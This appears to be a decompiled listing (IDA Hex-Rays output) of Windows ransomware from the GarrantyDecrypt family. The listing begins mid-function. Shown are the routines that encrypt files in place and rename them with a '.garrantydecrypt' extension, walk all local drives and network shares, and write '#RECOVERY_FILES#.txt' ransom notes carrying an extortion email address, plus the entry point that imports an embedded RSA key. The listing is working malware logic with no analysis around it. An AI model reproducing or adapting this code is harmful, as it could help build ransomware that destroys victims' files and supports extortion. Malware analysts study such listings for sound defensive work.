        lpBuffer = sub_401DFE(10240);
        if ( lpBuffer )
        {
          do
          {
            ReadFile(hFile, lpBuffer, 0x2800u, &NumberOfBytesRead, 0);
            v14 = NumberOfBytesRead;
            v23 = 0;
            if ( NumberOfBytesRead )
            {
              do
              {
                v8 = v23 & 0x3F;
                v16 = v8;
                if ( (v23 & 0x8000003F) == 0 )
                {
                  sub_401BD4(pbBuffer, (int)v12, v23 / 64, (v23 / 64) >> 31);
                  v8 = v16;
                }
                *((_BYTE *)lpBuffer + v23++) ^= v12[v8];
              }
              while ( v23 >= 0 && v23 < v14 );
            }
            SetFilePointerEx(hFile, (LARGE_INTEGER)-NumberOfBytesRead, 0, 1u);
            WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesRead, 0);
          }
          while ( v18 && NumberOfBytesRead == 10240 );
          sub_401E12(lpBuffer);
        }
        Buffer = -743588289;
        SetFilePointerEx(hFile, 0i64, 0, 2u);
        WriteFile(hFile, &Buffer, 4u, &NumberOfBytesRead, 0);
        WriteFile(hFile, v19, 0x30u, &NumberOfBytesRead, 0);
        CloseHandle(hFile);
        v9 = (WCHAR *)sub_401DFE(65534);
        v10 = v9;
        if ( v9 )
        {
          wnsprintfW(v9, 0x7FFF, L"%s%s", lpFileName, L".garrantydecrypt");
          MoveFileW(lpFileName, v10);
          sub_401E12(v10);
        }
      }
      sub_401E12((LPVOID)v19);
    }
  }
}
// 402193: conditional instruction was optimized away because %var_8.4>=0
// 40218D: mask 0x8000003F is shortened because %var_8.4 <= 0x7FFFFFFF
// 401638: using guessed type wchar_t aGarrantydecryp[17];
// 403038: using guessed type wchar_t *off_403038;
// 40204A: using guessed type char var_94[68];

//----- (004022A5) --------------------------------------------------------
void __cdecl sub_4022A5(int a1)
{
  WCHAR *v1; // eax
  const WCHAR *v2; // ebx
  HANDLE FileW; // ebx
  int v4; // eax
  int v5; // eax
  struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-264h] BYREF
  HANDLE hFindFile; // [esp+264h] [ebp-10h] BYREF
  unsigned int v8; // [esp+268h] [ebp-Ch]
  PWSTR pszDest; // [esp+26Ch] [ebp-8h]

  v1 = (WCHAR *)sub_401DFE(65534);
  v2 = v1;
  pszDest = v1;
  if ( v1 )
  {
    wnsprintfW(v1, 0x7FFF, L"%s\\*", a1);
    hFindFile = FindFirstFileW(v2, &FindFileData);
    if ( hFindFile != (HANDLE)-1 )
    {
      do
      {
        v8 = 0;
        while ( lstrcmpiW(FindFileData.cFileName, off_403024[v8 / 4]) )
        {
          v8 += 4;
          if ( v8 >= 0x14 )
          {
            wnsprintfW(pszDest, 0x7FFF, L"%s\\%s", a1, FindFileData.cFileName);
            if ( (FindFileData.dwFileAttributes & 0x10) != 0
              && lstrcmpW(FindFileData.cFileName, L".")
              && lstrcmpW(FindFileData.cFileName, L"..") )
            {
              sub_4022A5(pszDest);
            }
            else if ( lstrcmpW(FindFileData.cFileName, L"#RECOVERY_FILES#.txt")
                   && (FindFileData.dwFileAttributes & 0xA7) != 0 )
            {
              sub_40204A(pszDest);
            }
            break;
          }
        }
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
      wnsprintfW(pszDest, 0x7FFF, L"%s\\%s", a1, L"#RECOVERY_FILES#.txt");
      FileW = CreateFileW(pszDest, 0x40000000u, 1u, 0, 2u, 0x80u, 0);
      if ( FileW != (HANDLE)-1 )
      {
        v4 = lstrlenA(
               "All your files have been ENCRYPTED\r\n"
               "Do you really want to restore your files?\r\n"
               "Write to our email - garrantydecrypt@airmail.cc\r\n"
               "and tell us your unique ID\r\n");
        WriteFile(
          FileW,
          "All your files have been ENCRYPTED\r\n"
          "Do you really want to restore your files?\r\n"
          "Write to our email - garrantydecrypt@airmail.cc\r\n"
          "and tell us your unique ID\r\n",
          v4,
          (LPDWORD)&hFindFile,
          0);
        v5 = lstrlenA(lpBuffer);
        WriteFile(FileW, lpBuffer, v5, (LPDWORD)&hFindFile, 0);
        CloseHandle(FileW);
      }
    }
    sub_401E12(pszDest);
  }
}
// 403024: using guessed type wchar_t *off_403024[6];

//----- (00402448) --------------------------------------------------------
int __cdecl sub_402448(LPNETRESOURCEW lpNetResource)
{
  int result; // eax
  int *v2; // edi
  int *v3; // esi
  HANDLE hEnum; // [esp+Ch] [ebp-10h] BYREF
  DWORD BufferSize; // [esp+10h] [ebp-Ch] BYREF
  DWORD v6; // [esp+14h] [ebp-8h]
  DWORD cCount; // [esp+18h] [ebp-4h] BYREF

  cCount = -1;
  BufferSize = 0x4000;
  result = WNetOpenEnumW(2u, 0, 0x13u, lpNetResource, &hEnum);
  if ( !result )
  {
    v2 = (int *)sub_401DFE(BufferSize);
    if ( v2 )
    {
      while ( !WNetEnumResourceW(hEnum, &cCount, v2, &BufferSize) )
      {
        v6 = 0;
        if ( cCount )
        {
          v3 = v2 + 5;
          do
          {
            if ( (*(_BYTE *)(v3 - 2) & 2) != 0 )
              sub_402448((LPNETRESOURCEW)(v3 - 5));
            else
              sub_4022A5(*v3);
            ++v6;
            v3 += 8;
          }
          while ( v6 < cCount );
        }
      }
      sub_401E12(v2);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}

//----- (004024E4) --------------------------------------------------------
void sub_4024E4()
{
  int v0; // esi
  DWORD LogicalDrives; // ebx
  int v2; // edi
  WCHAR pszDest[260]; // [esp+10h] [ebp-208h] BYREF

  sub_402448(0);
  v0 = 65;
  LogicalDrives = GetLogicalDrives();
  v2 = 26;
  do
  {
    if ( (LogicalDrives & 1) != 0 )
    {
      wnsprintfW(pszDest, 260, L"\\\\?\\%c:", v0);
      sub_4022A5((int)pszDest);
    }
    LogicalDrives >>= 1;
    ++v0;
    --v2;
  }
  while ( v2 );
}

//----- (0040253E) --------------------------------------------------------
void __noreturn start()
{
  HCRYPTPROV v0; // eax
  const BYTE **v1; // eax
  const BYTE **v2; // esi
  unsigned int v3; // edi
  unsigned int v4; // ecx
  BYTE *v5; // eax
  BYTE v6; // dl
  HCRYPTKEY v7; // edi
  BYTE pbData[512]; // [esp+Ch] [ebp-204h] BYREF
  HCRYPTPROV phProv; // [esp+20Ch] [ebp-4h] BYREF

  sub_401E9F();
  sub_401E2F();
  sub_401F9E();
  phProv = 0;
  if ( CryptAcquireContextA(&phProv, 0, 0, 0x18u, 0xF0000000)
    || (v0 = CryptAcquireContextA(&phProv, 0, 0, 0x18u, 0xF0000008)) != 0 )
  {
    v0 = phProv;
  }
  hProv = v0;
  if ( v0 )
  {
    v1 = (const BYTE **)sub_4018EB();
    v2 = v1;
    if ( v1 )
    {
      v3 = (unsigned int)v1[3];
      v4 = 0;
      if ( v3 )
      {
        phProv = (HCRYPTPROV)v1[1];
        phProv -= (unsigned int)pbData;
        do
        {
          v5 = &pbData[v4];
          v6 = pbData[v4++ + phProv];
          *v5 = v6;
        }
        while ( v4 < v3 );
      }
      CryptImportKey(hProv, *v2, (DWORD)v2[2], 0, 0, &phKey);
      v7 = sub_40189E();
      if ( v7 )
      {
        phProv = (HCRYPTPROV)v2[3];
        if ( CryptEncrypt(v7, 0, 1, 0, pbData, &phProv, 0x200u) )
          lpBuffer = sub_4017BC(phProv, (int)pbData);
        CryptDestroyKey(v7);
      }
      sub_401E12((LPVOID)*v2);
      sub_401E12((LPVOID)v2[1]);
      sub_401E12(v2);
    }
    sub_4024E4();
    CryptReleaseContext(hProv, 0);
  }
  ExitProcess(0);
}
// 40253E: using guessed type void __noreturn start();
// 40253E: using guessed type BYTE pbData[512];

// nfuncs=16 queued=16 decompiled=16 lumina nreq=0 worse=0 better=0
// ALL OK, 16 function(s) have been successfully decompiled
